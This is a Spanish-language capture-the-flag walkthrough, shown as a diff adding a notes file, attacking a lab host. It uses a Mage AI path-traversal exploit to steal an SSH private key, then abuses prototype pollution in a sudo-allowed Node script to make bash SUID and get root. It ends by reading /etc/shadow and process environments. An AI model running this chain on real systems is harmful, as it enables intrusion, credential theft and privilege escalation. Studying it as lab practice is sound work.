@@ -1,1 +1,106 @@
+// Puerto Descubieros 
+nmap -sV 10.0.14.37
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 13:13 -0600
+Nmap scan report for 10.0.14.37
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+6789/tcp open  http    Tornado httpd 6.3.3
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+// Desacargar herramienta que vamos a utilizar para que un programa funcione de manera correcta:
+sudo apt update && sudo apt install lynx -y
+
+// Ahora descargar herrameinta de GitHub Mageai
+git clone https://github.com/NketiahGodfred/mageai_path-transversal.git
+
+//Vamos a su directorio del repo
+cd mageai_path-transversa
+// Damos permisos y ejecutamos
+chmod +x exploit.sh
+./exploit.sh
+
+//Listo ya que este ejecutando aparecera asi:
+./exploit.sh
+###############################
+#   built by hackercon        #
+###############################
+Enter File To Read - eg. /etc/passwd
+(FILE)> 
+
+//Lo que haremos es darle la direccion para obtener la llave ssh para que no nos pida contrasena
+/home/ETSCTF/.ssh/id_rsa
+
+// Nos va arrojar la llave ssh y lo gaudamos en un archivo de texto llamado id_rsa, cuando la de ctrl +c para salirnos del programa ya no lo utilizaremos
+
+//Luego abrimos una terminal donde esta guardado la llave para hacer lo siguiente
+chmod 600 id_rsa
+
+// NOs conectamos por ssh no nos deberia pedir ya contrasena
+ssh -i id_rsa ETSCTF@10.0.14.37
+
+// Le damos yes y vemos asi de la siguente manera:
+ssh -i id_rsa ETSCTF@10.0.14.37
+Linux statomage.echocity-f.com 6.1.0-50-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.176-1 (2026-07-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+ETSCTF@statomage:~$ 
+
+//Estamos dentro hacemos un id para ver que somos
+ETSCTF@statomage:~$ id
+uid=1000(ETSCTF) gid=65534(nogroup) groups=65534(nogroup)
+//Ahora vamos a escalar a root
+// Veamos que dice o hace sudo -l
+ETSCTF@statomage:~$ sudo -l
+Matching Defaults entries for ETSCTF on statomage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User ETSCTF may run the following commands on statomage:
+    (ALL : ALL) NOPASSWD: /opt/node/bin/state
+
+//Perfecto no pide contrasena veamos que tiene dentro ese directorio
+ETSCTF@statomage:~$ cat /opt/node/bin/state
+#!/opt/node/bin/node                                                                                                                                                                                                                        
+var args = process.argv.slice(2);                                                                                                                                                                                                           
+(async () => {                                                                                                                                                                                                                              
+  const lib = await import('@chasemoskal/snapstate');                                                                                                                                                                                       
+  var obj = JSON.parse(args[0]);                                                                                                                                                                                                            
+  var param = JSON.parse(args[1]);                                                                                                                                                                                                          
+  var val = args[2];                                                                                                                                                                                                                        
+  var authenticated = {}                                                                                                                                                                                                                    
+  try {
+    lib.attemptNestedProperty (obj,param, val)
+  } catch (e) { }
+  eval(authenticated.js);
+//Es vulnerable porque este código de Node.js es vulnerable a Prototype Pollution (Contaminación de Prototipos).
+Lo que permite ejecutar código JavaScript arbitrario con los mismos privilegios del script (en este caso, root).
+
+La librería @chasemoskal/snapstate (en la función attemptNestedProperty) no filtra claves peligrosas como __proto__.
+En JavaScript, casi todos los objetos heredan de un prototipo base (Object.prototype).  
+Al pasarle ["__proto__", "js"], la función modifica dicho prototipo global en lugar del objeto obj.
+Esto causa que cualquier objeto nuevo que se cree en la memoria del programa reciba la propiedad .js.
+
+//Vamos a darle el exploit 
+sudo /opt/node/bin/state '{"prop":"val"}' '["__proto__", "js"]' 'require("child_process").exec("chmod +s /usr/bin/bash")'
+
+// Despues escribimos lo siguiente:
+bash -p
+//En teoria somos root pero haremo un id y debe aparecer asi:
+bash-5.2# id
+uid=1000(ETSCTF) gid=65534(nogroup) euid=0(root) egid=0(root) groups=0(root),65534(nogroup)
+
+//Hacemos un whoami para confirmar y listo 
+bash-5.2# whoami
+root
+
+//Donde estan las banderas:
+ ls -la /root
+cat /etc/shadow
+cat /etc/passwd
+cat /proc/1/environ
